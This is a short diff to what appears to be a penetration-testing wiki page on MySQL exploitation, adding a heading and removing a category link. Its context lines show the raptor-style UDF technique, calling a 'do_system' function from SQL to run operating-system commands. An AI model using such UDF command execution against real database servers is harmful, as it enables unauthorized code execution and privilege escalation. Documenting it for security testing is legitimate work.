@@ -3,6 +3,8 @@ title: MySQL
 permalink: /MySQL/
 ---
 
+# MySQL
+
 Exploitation
 ------------
 
@@ -29,4 +31,3 @@ select * from mysql.func;
 select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
 ```
 
-[Category:Technologies](/Category:Technologies "wikilink")
